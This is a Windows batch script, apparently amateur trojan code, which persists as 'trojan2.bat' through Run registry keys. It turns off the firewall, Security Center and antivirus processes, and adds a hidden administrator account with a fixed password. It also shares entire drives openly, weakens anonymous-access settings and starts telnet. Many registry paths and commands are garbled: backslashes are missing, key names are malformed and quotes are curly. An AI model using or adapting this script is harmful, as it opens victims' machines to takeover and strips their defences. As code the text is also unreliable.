 @system
echo>>restart
echo>>del :C
echo>>del:E
echo>>error
cls
echo $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$
echo $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$
echo ——————————————————-
echo =============
echo =============
echo =============
echo ——————————————————-
echo $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$
echo $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ $$$$$
@echo off
color 0a
cls
IF not exist %windir%%0 copy %0 %windir%
netsh firewall set opmode=disable
net stop ShareAccess
Net stop “Security Center”
Tskill *AV*
NET USER admin admin123 /ADD
NET LOCAL GROUP ADMINISTRATORS admin /ADD
Reg ADD “HKEY_LOCAL_MACHINESoftwareMicrosoftWindows NTCurrentVersionWinlogon SpecialAccounts UserList” /v”admin” /t REG_DWORD/d 0 /f
REG ADD HKLMSYSTEMControlSet001ServicesMessenger /v Start /t REG_DWORD /d 2/f
Net start messenger
dir *.*>>Filelist.txt
Net send 192.168.1.100 >hasil.txt
NET SHARE system=%SYSTEMDRIVE% /UNLIMITED
NET SHARE data1=D: /UNLIMITED
NET SHARE data1=E: /UNLIMITED
REG ADD HKCRNetworkSharingHandler /ve /t REG_SZ/d “”/f
REG ADD HKLDSYSTEMCurrentControlSetLSA /v forceguest /t REG_DWORD /d 0 /f
REG ADD HKLDSYSTEMCurrentControlSetLSA /v restrictanonymous /t REG_DWORD /d 0 /f
REG ADD HKLMSYSTEMControlSet001ServicesTIntSvr /v Start /t REG_DWORD /d 2/f
Net start tIntsvr
REG ADD HKLMSoftwareMicrosoftWindowspCurrentVersionRunv Eksplorer /t REG_SZ /d %windir%trojan2.bat /f
REG ADD HKCUSoftwareMicrosoftWindowspCurrentVersionRunv Eksplorer /t REG_SZ /d %windir%trojan2.bat /f